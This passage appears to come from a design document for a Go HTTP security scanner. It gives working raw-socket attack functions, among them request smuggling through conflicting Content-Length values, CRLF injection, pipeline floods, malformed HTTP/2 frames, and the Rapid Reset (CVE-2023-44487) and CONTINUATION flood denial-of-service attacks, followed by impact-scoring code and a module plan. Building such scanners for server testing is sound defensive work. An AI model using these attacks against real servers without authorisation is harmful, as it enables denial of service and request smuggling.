        rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "multiple-spaces",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 6e. Very Long Method Name

```go
// methodOversized sends a 64KB method name. This tests method name buffer limits.
func methodOversized(rc *RawConn) AttackResult {
    longMethod := strings.Repeat("A", 65536)
    req := fmt.Sprintf(
        "%s / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "\r\n",
        longMethod, rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "method-oversized-64kb",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 6f. Very Long URI

```go
// uriOversized sends a 64KB URI. Most servers limit URI to 8KB (Go) or 4KB-64KB.
func uriOversized(rc *RawConn) AttackResult {
    longURI := "/" + strings.Repeat("A", 65536)
    req := fmt.Sprintf(
        "GET %s HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "\r\n",
        longURI, rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "uri-oversized-64kb",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 6g. No URI (Method Directly Before Version)

```go
// noURI sends "GET HTTP/1.1" with no path. The server's request line parser
// will either treat "HTTP/1.1" as the URI or reject the request.
func noURI(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "GET HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "\r\n",
        rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "no-uri",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 6h. Absolute URI Form

```go
// absoluteURI sends the full URL in the request line instead of just the path.
// Proxies must support this; origin servers often don't handle it correctly.
func absoluteURI(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "GET http://%s/ HTTP/1.1\r\n"+
            "Host: different-host.com\r\n"+ // conflict between URI host and Host header
            "\r\n",
        rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "absolute-uri",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 6i. Request Line with CRLF Injection

```go
// requestLineCRLF injects a second request line within the first.
func requestLineCRLF(rc *RawConn) AttackResult {
    // The \r\n in the URI terminates the request line early.
    // Everything after it becomes a "header" -- but it's actually
    // a smuggled request line.
    req := fmt.Sprintf(
        "GET / HTTP/1.1\r\nEvil: Header\r\nHost: %s\r\n\r\n",
        rc.host,
    )
    // But the real attack is injecting into the URI itself:
    req = "GET /path\r\nX-Injected: true\r\nHTTP/1.1\r\n" +
        "Host: " + rc.host + "\r\n\r\n"

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "request-line-crlf",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

---

## 7. Connection-Level Tricks

### 7a. Conflicting Content-Length on Same Connection

```go
// pipelineConflictCL sends two pipelined requests on the same connection
// where the first request's Content-Length is wrong, causing the server
// to misparse the start of the second request.
func pipelineConflictCL(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        // Request 1: declares 100 bytes but body is only 5
        "POST /first HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "Content-Length: 100\r\n"+
            "Connection: keep-alive\r\n"+
            "\r\n"+
            "hello"+
        // Request 2: starts immediately after, but the server thinks
        // it's still reading Request 1's body
        "GET /second HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "Connection: close\r\n"+
            "\r\n",
        rc.host, rc.host,
    )

    err := rc.SendString(req)
    resp, recvErr := rc.Recv(8192)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "pipeline-conflict-cl",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 7b. Request Then Garbage

```go
// requestThenGarbage sends a valid request followed immediately by random bytes.
// Tests how servers handle unexpected data after a complete request on keep-alive.
func requestThenGarbage(rc *RawConn) AttackResult {
    garbage := make([]byte, 1024)
    for i := range garbage {
        garbage[i] = byte(i % 256)
    }

    req := fmt.Sprintf(
        "GET / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "Connection: keep-alive\r\n"+
            "\r\n",
        rc.host,
    )

    // Send valid request
    err := rc.SendString(req)
    if err != nil {
        return AttackResult{Attack: "request-then-garbage", Error: err}
    }

    // Read response
    resp, _ := rc.Recv(4096)

    // Send garbage immediately
    err = rc.Send(garbage)
    resp2, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "request-then-garbage",
        Sent:     len(req) + len(garbage),
        Received: len(resp) + len(resp2),
        Error:    recvErr,
    }
}
```

### 7c. Half-Close (FIN Without Full Close)

```go
// halfClose sends a request, then closes the write side (sends TCP FIN)
// while keeping the read side open. Tests server behavior when the client
// signals "no more data" mid-connection.
func halfClose(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "GET / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "Connection: keep-alive\r\n"+
            "\r\n",
        rc.host,
    )

    err := rc.SendString(req)
    if err != nil {
        return AttackResult{Attack: "half-close", Error: err}
    }

    // Half-close: send FIN but keep reading
    rc.HalfClose()

    // Try to read the response
    resp, recvErr := rc.Recv(4096)

    return AttackResult{
        Attack:   "half-close",
        Sent:     len(req),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 7d. HTTP/1.1 Then HTTP/2 Preface on Same Connection

```go
// h1ThenH2Preface sends an HTTP/1.1 request, then immediately sends the
// HTTP/2 connection preface on the same TCP connection. This tests how
// servers handle protocol confusion.
func h1ThenH2Preface(rc *RawConn) AttackResult {
    // HTTP/2 connection preface: magic octets
    h2Preface := "PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n"

    req := fmt.Sprintf(
        "GET / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "Connection: keep-alive\r\n"+
            "\r\n",
        rc.host,
    )

    // Send H1 request
    err := rc.SendString(req)
    if err != nil {
        return AttackResult{Attack: "h1-then-h2", Error: err}
    }

    // Read H1 response
    resp, _ := rc.Recv(4096)

    // Send H2 preface
    err = rc.SendString(h2Preface)

    // Try to read server reaction
    resp2, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "h1-then-h2",
        Sent:     len(req) + len(h2Preface),
        Received: len(resp) + len(resp2),
        Error:    recvErr,
    }
}
```

### 7e. Pipeline 1000 Requests Without Reading

```go
// pipelineFlood sends 1000 pipelined requests without reading any responses.
// This tests the server's write buffer limits and backpressure handling.
// If the server buffers all responses in memory, this causes OOM.
func pipelineFlood(rc *RawConn) AttackResult {
    var totalSent int

    for i := 0; i < 1000; i++ {
        req := fmt.Sprintf(
            "GET /?flood=%d HTTP/1.1\r\n"+
                "Host: %s\r\n"+
                "Connection: keep-alive\r\n"+
                "\r\n",
            i, rc.host,
        )

        err := rc.SendString(req)
        if err != nil {
            return AttackResult{
                Attack: "pipeline-flood-1000",
                Sent:   totalSent,
                Error:  err,
            }
        }
        totalSent += len(req)
    }

    // Now try to read -- server may have closed or may send all 1000 responses
    var totalRecv int
    for {
        data, err := rc.Recv(65536)
        totalRecv += len(data)
        if err != nil {
            break
        }
    }

    return AttackResult{
        Attack:   "pipeline-flood-1000",
        Sent:     totalSent,
        Received: totalRecv,
    }
}
```

### 7f. Incomplete Request Line (Slow Start)

```go
// incompleteRequestLine sends the method byte by byte with long delays.
// The server must buffer the partial request line; many have short timeouts.
func incompleteRequestLine(ctx context.Context, rc *RawConn) AttackResult {
    method := "GET / HTTP/1.1\r\n"
    var sent int

    for i := 0; i < len(method); i++ {
        select {
        case <-ctx.Done():
            return AttackResult{Attack: "incomplete-request-line", Sent: sent, Error: ctx.Err()}
        default:
        }

        err := rc.Send([]byte{method[i]})
        if err != nil {
            return AttackResult{Attack: "incomplete-request-line", Sent: sent, Error: err}
        }
        sent++
        time.Sleep(2 * time.Second) // 2s between each byte
    }

    // Finish the request
    rest := fmt.Sprintf("Host: %s\r\n\r\n", rc.host)
    rc.SendString(rest)
    sent += len(rest)

    resp, recvErr := rc.Recv(4096)
    return AttackResult{
        Attack:   "incomplete-request-line",
        Sent:     sent,
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 7g. TCP RST Instead of FIN

```go
// tcpRSTAfterRequest sends a request, then abruptly resets the connection
// (via SetLinger(0)) instead of gracefully closing. This tests server
// handling of aborted connections.
func tcpRSTAfterRequest(rc *RawConn) AttackResult {
    req := fmt.Sprintf(
        "POST / HTTP/1.1\r\n"+
            "Host: %s\r\n"+
            "Content-Length: 1000000\r\n"+
            "Connection: close\r\n"+
            "\r\n"+
            "partial-body",
        rc.host,
    )

    err := rc.SendString(req)
    if err != nil {
        return AttackResult{Attack: "tcp-rst-after-request", Error: err}
    }

    // Set linger to 0: causes RST instead of FIN on close
    if tc, ok := rc.conn.(*net.TCPConn); ok {
        tc.SetLinger(0)
    }
    rc.Close()

    return AttackResult{
        Attack: "tcp-rst-after-request",
        Sent:   len(req),
        Closed: true,
    }
}
```

---

## 8. HTTP/2 Binary Frame Attacks

HTTP/2 uses a binary framing layer. To send malformed frames, we need to establish
a TLS connection with ALPN "h2", send the connection preface, and then write raw
binary frame data.

### HTTP/2 Frame Format Reference

```
+-----------------------------------------------+
|                 Length (24)                     |
+---------------+---------------+---------------+
|   Type (8)    |   Flags (8)   |
+-+-------------+---------------+
|R|                 Stream ID (31)              |
+=+==============================================+
|                 Frame Payload (0...)           |
+-----------------------------------------------+
```

Frame types:
- 0x0: DATA
- 0x1: HEADERS
- 0x2: PRIORITY
- 0x3: RST_STREAM
- 0x4: SETTINGS
- 0x5: PUSH_PROMISE
- 0x6: PING
- 0x7: GOAWAY
- 0x8: WINDOW_UPDATE
- 0x9: CONTINUATION

### H2 Frame Construction Helpers

```go
// h2Frame builds a raw HTTP/2 frame.
// length is derived from payload; type, flags, and streamID are explicit.
func h2Frame(frameType byte, flags byte, streamID uint32, payload []byte) []byte {
    length := len(payload)
    frame := make([]byte, 9+length)

    // Length (24 bits, big-endian)
    frame[0] = byte(length >> 16)
    frame[1] = byte(length >> 8)
    frame[2] = byte(length)

    // Type
    frame[3] = frameType

    // Flags
    frame[4] = flags

    // Stream ID (31 bits, big-endian, R bit = 0)
    frame[5] = byte(streamID >> 24) & 0x7f
    frame[6] = byte(streamID >> 16)
    frame[7] = byte(streamID >> 8)
    frame[8] = byte(streamID)

    copy(frame[9:], payload)
    return frame
}

// h2Preface returns the HTTP/2 connection preface magic bytes.
func h2Preface() []byte {
    return []byte("PRI * HTTP/2.0\r\n\r\nSM\r\n\r\n")
}

// h2SettingsFrame builds a SETTINGS frame with the given key-value pairs.
// Each setting is 6 bytes: 2-byte ID + 4-byte value.
func h2SettingsFrame(settings map[uint16]uint32) []byte {
    payload := make([]byte, 0, len(settings)*6)
    for id, val := range settings {
        setting := make([]byte, 6)
        setting[0] = byte(id >> 8)
        setting[1] = byte(id)
        setting[2] = byte(val >> 24)
        setting[3] = byte(val >> 16)
        setting[4] = byte(val >> 8)
        setting[5] = byte(val)
        payload = append(payload, setting...)
    }
    return h2Frame(0x04, 0x00, 0, payload) // type=SETTINGS, flags=0, stream=0
}

// h2SettingsAck builds an empty SETTINGS frame with ACK flag.
func h2SettingsAck() []byte {
    return h2Frame(0x04, 0x01, 0, nil) // type=SETTINGS, flags=ACK, stream=0
}

// h2Connect establishes an HTTP/2 connection over TLS with ALPN negotiation.
// Returns the raw TLS conn after sending the preface and initial SETTINGS.
func h2Connect(target string, timeout time.Duration) (*RawConn, error) {
    parsed, _ := url.Parse(target)
    addr := parsed.Host
    if !strings.Contains(addr, ":") {
        addr += ":443"
    }

    tlsConn, err := tls.DialWithDialer(
        &net.Dialer{Timeout: timeout},
        "tcp", addr,
        &tls.Config{
            InsecureSkipVerify: true,
            NextProtos:         []string{"h2"},
        },
    )
    if err != nil {
        return nil, err
    }

    // Verify ALPN negotiated h2
    if tlsConn.ConnectionState().NegotiatedProtocol != "h2" {
        tlsConn.Close()
        return nil, fmt.Errorf("ALPN did not negotiate h2")
    }

    rc := &RawConn{conn: tlsConn, addr: addr, host: parsed.Host, timeout: timeout}

    // Send connection preface
    rc.Send(h2Preface())

    // Send initial SETTINGS frame
    rc.Send(h2SettingsFrame(map[uint16]uint32{
        0x1: 4096,    // HEADER_TABLE_SIZE
        0x3: 100,     // MAX_CONCURRENT_STREAMS
        0x4: 65535,   // INITIAL_WINDOW_SIZE
        0x5: 16384,   // MAX_FRAME_SIZE
    }))

    // Read server preface (SETTINGS frame)
    rc.Recv(4096)

    // Send SETTINGS ACK
    rc.Send(h2SettingsAck())

    return rc, nil
}
```

### 8a. Invalid Frame Type

```go
// h2InvalidFrameType sends a frame with an unrecognized type byte.
// RFC 9113: implementations MUST ignore unknown frame types.
// But some implementations crash or panic.
func h2InvalidFrameType(rc *RawConn) AttackResult {
    // Frame type 0xFF is not defined
    frame := h2Frame(0xFF, 0x00, 1, []byte("garbage payload"))
    err := rc.Send(frame)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "h2-invalid-frame-type",
        Sent:     len(frame),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 8b. SETTINGS Frame With Impossible Values

```go
// h2SettingsImpossible sends SETTINGS with values that violate constraints.
func h2SettingsImpossible(rc *RawConn) []AttackResult {
    attacks := []struct {
        name     string
        settings map[uint16]uint32
    }{
        {
            "max-frame-size-too-small",
            map[uint16]uint32{0x5: 0},  // MAX_FRAME_SIZE must be >= 16384
        },
        {
            "max-frame-size-too-large",
            map[uint16]uint32{0x5: 0xFFFFFFFF}, // MAX_FRAME_SIZE must be <= 16777215
        },
        {
            "window-size-overflow",
            map[uint16]uint32{0x4: 0x80000000}, // INITIAL_WINDOW_SIZE must be <= 2^31-1
        },
        {
            "enable-push-invalid",
            map[uint16]uint32{0x2: 2}, // ENABLE_PUSH must be 0 or 1
        },
        {
            "header-table-size-huge",
            map[uint16]uint32{0x1: 0xFFFFFFFF}, // HEADER_TABLE_SIZE = 4GB
        },
        {
            "max-concurrent-zero",
            map[uint16]uint32{0x3: 0}, // MAX_CONCURRENT_STREAMS = 0 (refuse all)
        },
        {
            "unknown-setting-id",
            map[uint16]uint32{0xFFFF: 12345}, // Unknown setting ID
        },
    }

    var results []AttackResult
    for _, a := range attacks {
        frame := h2SettingsFrame(a.settings)
        rc2, err := h2Connect("https://"+rc.addr, rc.timeout)
        if err != nil {
            results = append(results, AttackResult{Attack: "h2-settings-" + a.name, Error: err})
            continue
        }

        err = rc2.Send(frame)
        resp, recvErr := rc2.Recv(4096)
        rc2.Close()

        if err != nil {
            recvErr = err
        }

        results = append(results, AttackResult{
            Attack:   "h2-settings-" + a.name,
            Sent:     len(frame),
            Received: len(resp),
            Error:    recvErr,
        })
    }
    return results
}
```

### 8c. HEADERS Frame With Invalid HPACK

```go
// h2InvalidHPACK sends a HEADERS frame with garbage bytes where HPACK-encoded
// headers should be. HPACK is a stateful compression scheme; invalid data
// corrupts the decoder state and should cause a COMPRESSION_ERROR (0x9).
func h2InvalidHPACK(rc *RawConn) []AttackResult {
    payloads := []struct {
        name    string
        payload []byte
    }{
        {
            "all-zeros",
            make([]byte, 64),
        },
        {
            "all-ff",
            bytes.Repeat([]byte{0xFF}, 64),
        },
        {
            "huffman-overflow",
            // Starts with indexed header (bit 7=1) but index is too large
            []byte{0xFF, 0xFF, 0xFF, 0xFF, 0x0F},
        },
        {
            "dynamic-table-overflow",
            // Literal header with incremental indexing, huge name length
            []byte{0x40, 0xFF, 0xFF, 0xFF, 0xFF, 0x0F},
        },
        {
            "incomplete-integer",
            // Incomplete HPACK integer encoding
            []byte{0x1F, 0xFF},
        },
        {
            "invalid-pseudo-header",
            // Try to encode :invalid pseudo-header (not in static table)
            []byte{0x00, 0x08, ':', 'i', 'n', 'v', 'a', 'l', 'i', 'd',
                   0x05, 'v', 'a', 'l', 'u', 'e'},
        },
    }

    var results []AttackResult
    for _, p := range payloads {
        // HEADERS frame: type=0x1, flags=0x04 (END_HEADERS), stream=1
        frame := h2Frame(0x01, 0x04, 1, p.payload)

        rc2, err := h2Connect("https://"+rc.addr, rc.timeout)
        if err != nil {
            results = append(results, AttackResult{Attack: "h2-hpack-" + p.name, Error: err})
            continue
        }

        err = rc2.Send(frame)
        resp, recvErr := rc2.Recv(4096)
        rc2.Close()

        if err != nil {
            recvErr = err
        }

        results = append(results, AttackResult{
            Attack:   "h2-hpack-" + p.name,
            Sent:     len(frame),
            Received: len(resp),
            Error:    recvErr,
        })
    }
    return results
}
```

### 8d. DATA Frame on Stream 0

```go
// h2DataOnStream0 sends a DATA frame on stream 0, which is reserved for
// connection-level frames. This MUST be treated as a connection error
// (PROTOCOL_ERROR) per RFC 9113 Section 6.1.
func h2DataOnStream0(rc *RawConn) AttackResult {
    frame := h2Frame(0x00, 0x00, 0, []byte("data on stream zero"))

    err := rc.Send(frame)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "h2-data-stream-0",
        Sent:     len(frame),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 8e. Frame Length Mismatch

```go
// h2LengthMismatch sends a frame where the declared length doesn't match
// the actual payload size. This tests frame boundary parsing.
func h2LengthMismatch(rc *RawConn) []AttackResult {
    var results []AttackResult

    // Declared length > actual: server reads past frame boundary
    frame1 := h2Frame(0x06, 0x00, 0, []byte("12345678")) // PING, should be 8 bytes
    // Manually corrupt the length field to say 100
    frame1[0] = 0
    frame1[1] = 0
    frame1[2] = 100

    rc2, err := h2Connect("https://"+rc.addr, rc.timeout)
    if err == nil {
        err = rc2.Send(frame1)
        resp, _ := rc2.Recv(4096)
        rc2.Close()
        results = append(results, AttackResult{
            Attack:   "h2-length-larger-than-payload",
            Sent:     len(frame1),
            Received: len(resp),
            Error:    err,
        })
    }

    // Declared length < actual: server sees extra bytes as next frame
    frame2 := h2Frame(0x06, 0x00, 0, []byte("12345678"))
    // Manually set length to 4 (half the actual ping payload)
    frame2[0] = 0
    frame2[1] = 0
    frame2[2] = 4

    rc3, err := h2Connect("https://"+rc.addr, rc.timeout)
    if err == nil {
        err = rc3.Send(frame2)
        resp, _ := rc3.Recv(4096)
        rc3.Close()
        results = append(results, AttackResult{
            Attack:   "h2-length-smaller-than-payload",
            Sent:     len(frame2),
            Received: len(resp),
            Error:    err,
        })
    }

    // Length = 0 for PING (which requires exactly 8 bytes)
    frame3 := h2Frame(0x06, 0x00, 0, nil)

    rc4, err := h2Connect("https://"+rc.addr, rc.timeout)
    if err == nil {
        err = rc4.Send(frame3)
        resp, _ := rc4.Recv(4096)
        rc4.Close()
        results = append(results, AttackResult{
            Attack:   "h2-zero-length-ping",
            Sent:     len(frame3),
            Received: len(resp),
            Error:    err,
        })
    }

    return results
}
```

### 8f. WINDOW_UPDATE With Zero Increment

```go
// h2WindowUpdateZero sends WINDOW_UPDATE with a 0 increment.
// RFC 9113 Section 6.9.1: "A receiver MUST treat [...] a WINDOW_UPDATE
// frame with an increment of 0 as [...] a connection error of type PROTOCOL_ERROR."
func h2WindowUpdateZero(rc *RawConn) AttackResult {
    // WINDOW_UPDATE payload: 4 bytes, increment = 0
    payload := []byte{0x00, 0x00, 0x00, 0x00}
    frame := h2Frame(0x08, 0x00, 0, payload) // stream 0 = connection level

    err := rc.Send(frame)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "h2-window-update-zero",
        Sent:     len(frame),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 8g. RST_STREAM on Stream 0

```go
// h2RSTStream0 sends RST_STREAM on stream 0. RST_STREAM is only valid
// on non-zero streams. Sending it on stream 0 should be a PROTOCOL_ERROR.
func h2RSTStream0(rc *RawConn) AttackResult {
    // RST_STREAM payload: 4-byte error code (0x00 = NO_ERROR)
    payload := []byte{0x00, 0x00, 0x00, 0x00}
    frame := h2Frame(0x03, 0x00, 0, payload) // type=RST_STREAM, stream=0

    err := rc.Send(frame)
    resp, recvErr := rc.Recv(4096)
    if err != nil {
        recvErr = err
    }

    return AttackResult{
        Attack:   "h2-rst-stream-0",
        Sent:     len(frame),
        Received: len(resp),
        Error:    recvErr,
    }
}
```

### 8h. GOAWAY With Invalid Last Stream ID

```go
// h2GOAWAYInvalid sends GOAWAY with a last-stream-id higher than any opened stream.
// Also tests with odd and even stream IDs (only odd should be from client).
func h2GOAWAYInvalid(rc *RawConn) []AttackResult {
    goaways := []struct {
        name         string
        lastStreamID uint32
        errorCode    uint32
    }{
        {"future-stream", 0x7FFFFFFF, 0x00},    // max valid stream ID
        {"even-stream", 2, 0x00},                // even = server-initiated (invalid from client)
        {"negative-error", 0, 0xFFFFFFFF},       // unknown error code
        {"with-debug", 1, 0x00},                 // followed by debug data
    }

    var results []AttackResult
    for _, g := range goaways {
        payload := make([]byte, 8)
        // Last-Stream-ID (4 bytes)
        payload[0] = byte(g.lastStreamID >> 24) & 0x7f
        payload[1] = byte(g.lastStreamID >> 16)
        payload[2] = byte(g.lastStreamID >> 8)
        payload[3] = byte(g.lastStreamID)
        // Error Code (4 bytes)
        payload[4] = byte(g.errorCode >> 24)
        payload[5] = byte(g.errorCode >> 16)
        payload[6] = byte(g.errorCode >> 8)
        payload[7] = byte(g.errorCode)

        if g.name == "with-debug" {
            // Append 1KB of debug data
            payload = append(payload, bytes.Repeat([]byte("DEBUG"), 200)...)
        }

        frame := h2Frame(0x07, 0x00, 0, payload) // type=GOAWAY, stream=0

        rc2, err := h2Connect("https://"+rc.addr, rc.timeout)
        if err != nil {
            results = append(results, AttackResult{Attack: "h2-goaway-" + g.name, Error: err})
            continue
        }

        err = rc2.Send(frame)
        resp, recvErr := rc2.Recv(4096)
        rc2.Close()

        if err != nil {
            recvErr = err
        }

        results = append(results, AttackResult{
            Attack:   "h2-goaway-" + g.name,
            Sent:     len(frame),
            Received: len(resp),
            Error:    recvErr,
        })
    }
    return results
}
```

### 8i. H2 Rapid Reset (CVE-2023-44487)

```go
// h2RapidReset implements the HTTP/2 Rapid Reset attack (CVE-2023-44487).
// Opens many streams via HEADERS and immediately RST_STREAMs them.
// The server does work per stream but the client never reads responses.
// This is a resource exhaustion attack, not parser confusion, but included
// because it requires raw H2 frames.
func h2RapidReset(rc *RawConn, numStreams int) AttackResult {
    // Minimal HPACK-encoded headers for "GET /"
    // 0x82 = indexed header field (:method: GET, index 2)
    // 0x84 = indexed header field (:path: /, index 4)
    // 0x86 = indexed header field (:scheme: https, index 7)
    // Plus literal :authority header
    hpackHeaders := []byte{
        0x82,                                           // :method: GET
        0x84,                                           // :path: /
        0x86,                                           // :scheme: https
        0x41, byte(len(rc.host)),                       // :authority: literal, indexed name (index 1)
    }
    hpackHeaders = append(hpackHeaders, []byte(rc.host)...)

    var totalSent int
    for i := 0; i < numStreams; i++ {
        streamID := uint32(2*i + 1) // odd stream IDs for client-initiated

        // Send HEADERS frame (END_HEADERS flag = 0x04)
        headersFrame := h2Frame(0x01, 0x04, streamID, hpackHeaders)
        err := rc.Send(headersFrame)
        if err != nil {
            return AttackResult{Attack: "h2-rapid-reset", Sent: totalSent, Error: err}
        }
        totalSent += len(headersFrame)

        // Immediately RST_STREAM (error code = 0x08 CANCEL)
        rstPayload := []byte{0x00, 0x00, 0x00, 0x08}
        rstFrame := h2Frame(0x03, 0x00, streamID, rstPayload)
        err = rc.Send(rstFrame)
        if err != nil {
            return AttackResult{Attack: "h2-rapid-reset", Sent: totalSent, Error: err}
        }
        totalSent += len(rstFrame)
    }

    // Read whatever the server sends back
    var totalRecv int
    for {
        data, err := rc.Recv(65536)
        totalRecv += len(data)
        if err != nil {
            break
        }
    }

    return AttackResult{
        Attack:   "h2-rapid-reset",
        Sent:     totalSent,
        Received: totalRecv,
    }
}
```

### 8j. CONTINUATION Frame Flood

```go
// h2ContinuationFlood sends a HEADERS frame without END_HEADERS, followed
// by thousands of tiny CONTINUATION frames. The server must buffer all
// header fragments until END_HEADERS is received. This can exhaust memory.
// (Related to CVE-2024-27983 in Node.js, CVE-2024-27316 in Apache.)
func h2ContinuationFlood(rc *RawConn, numFrames int) AttackResult {
    // Initial HEADERS frame WITHOUT END_HEADERS flag
    hpackHeaders := []byte{0x82, 0x84, 0x86} // minimal :method, :path, :scheme
    headersFrame := h2Frame(0x01, 0x00, 1, hpackHeaders) // flags=0 (no END_HEADERS)

    err := rc.Send(headersFrame)
    if err != nil {
        return AttackResult{Attack: "h2-continuation-flood", Error: err}
    }
    totalSent := len(headersFrame)

    // Send many CONTINUATION frames with padding data
    for i := 0; i < numFrames; i++ {
        // Literal header field never indexed, with a 200-byte value
        contPayload := []byte{0x00, 0x05, 'x', '-', 'p', 'a', 'd'}
        contPayload = append(contPayload, byte(200)) // value length
        contPayload = append(contPayload, bytes.Repeat([]byte("X"), 200)...)

        flags := byte(0x00) // no END_HEADERS
        if i == numFrames-1 {
            flags = 0x04 // END_HEADERS on last frame
        }

        contFrame := h2Frame(0x09, flags, 1, contPayload) // type=CONTINUATION
        err = rc.Send(contFrame)
        if err != nil {
            break
        }
        totalSent += len(contFrame)
    }

    resp, recvErr := rc.Recv(4096)
    return AttackResult{
        Attack:   "h2-continuation-flood",
        Sent:     totalSent,
        Received: len(resp),
        Error:    recvErr,
    }
}
```

**Expected H2 server behavior**:
| Attack | RFC Requirement | Vulnerable Response |
|--------|----------------|---------------------|
| Invalid frame type | MUST ignore | Crash, connection close |
| Invalid SETTINGS | GOAWAY with PROTOCOL_ERROR | Hang, crash, accept invalid values |
| Invalid HPACK | GOAWAY with COMPRESSION_ERROR | Memory corruption, state desync |
| DATA on stream 0 | PROTOCOL_ERROR | Process data, crash |
| Length mismatch | FRAME_SIZE_ERROR | Read past boundary, desync |
| WINDOW_UPDATE(0) | PROTOCOL_ERROR | Flow control stall |
| RST_STREAM on 0 | PROTOCOL_ERROR | Connection state corruption |
| Rapid Reset | Rate limit streams | OOM from server-side work |
| CONTINUATION flood | Buffer until END_HEADERS | OOM from unbounded buffering |

---

## 9. Detection Strategies

### How to Determine If an Attack Worked

```go
// assessImpact analyzes an AttackResult to determine severity.
func assessImpact(baseline time.Duration, result AttackResult) string {
    class := result.Classify()

    switch class {
    case "CONNECTION_RESET":
        // Server actively closed. Could be proper rejection or crash.
        // Need to check if server is still alive after.
        return "medium"  // verify with health probe

    case "TIMEOUT", "HUNG":
        // Server stopped responding. This is the most dangerous outcome.
        return "high"    // potential DoS

    case "SERVER_ERROR":
        // 5xx response. Server processed the malformed input and errored.
        return "high"    // internal error triggered

    case "BROKEN_PIPE":
        // Server closed during our write. Usually means parser rejected early.
        return "low"     // proper rejection

    case "EOF":
        // Server closed gracefully. Often proper handling.
        return "low"

    case "REJECTED":
        // 4xx response. Server properly rejected the malformed input.
        return "info"    // working as intended

    case "ACCEPTED":
        // Server processed it normally. For malformed input, this is BAD
        // because it means the server is accepting invalid HTTP.
        return "high"    // parser is too permissive

    default:
        return "info"
    }
}

// healthProbe checks if the target is still responding after an attack.
// A failed health probe after an attack = critical finding.
func healthProbe(target string, timeout time.Duration) (alive bool, latency time.Duration) {
    start := time.Now()
    conn, err := net.DialTimeout("tcp", target, timeout)
    if err != nil {
        return false, time.Since(start)
    }
    defer conn.Close()

    // Send a minimal valid HTTP request
    req := fmt.Sprintf("GET / HTTP/1.1\r\nHost: %s\r\nConnection: close\r\n\r\n", target)
    conn.SetWriteDeadline(time.Now().Add(timeout))
    conn.Write([]byte(req))

    conn.SetReadDeadline(time.Now().Add(timeout))
    buf := make([]byte, 1)
    _, err = conn.Read(buf)
    latency = time.Since(start)

    return err == nil, latency
}
```

---

## 10. Proposed Module Structure

### Integration into Existing Scanner

The raw TCP attacks should be a new module alongside the existing `SlowHTTPModule`,
`ProtocolModule`, and `ChaosModule`. The key difference is that raw TCP attacks
use `net.Conn` directly instead of going through the engine's `http.Client`.

```
internal/scanner/attacks/
    rawtcp.go          <- NEW: Raw TCP attack module
    rawtcp_h1.go       <- NEW: HTTP/1.1 raw attacks (smuggling, chunks, headers)
    rawtcp_h2.go       <- NEW: HTTP/2 binary frame attacks
    rawtcp_conn.go     <- NEW: Connection-level attacks (pipeline, half-close, RST)
    slowhttp.go        (existing: SlowHTTPModule with Run() for raw socket attacks)
    protocol.go        (existing: ProtocolModule via http.Client)
    chaos.go           (existing: ChaosModule via http.Client)
```

### Module Interface

```go
// RawTCPModule implements both AttackModule (for http.Client-based attacks
// that serve as comparisons) and a separate Run method for raw TCP attacks.
type RawTCPModule struct{}

func (m *RawTCPModule) Name() string     { return "rawtcp" }
func (m *RawTCPModule) Category() string { return "protocol-chaos" }

// GenerateRequests returns http.Client-based probes that complement the
// raw TCP attacks. These serve as baselines to compare behavior.
func (m *RawTCPModule) GenerateRequests(target string) []scanner.AttackRequest {
    // Return baseline requests that test the same paths via http.Client
    // so we can compare "sanitized" vs "raw" behavior.
    return nil
}

// Run executes all raw TCP attacks against the target.
// This is called separately from the normal module flow because
// raw TCP attacks cannot go through http.Client.
func (m *RawTCPModule) Run(ctx context.Context, target string, cfg RawSocketConfig) []scanner.Finding {
    var findings []scanner.Finding

    // Phase 1: HTTP/1.1 smuggling attacks
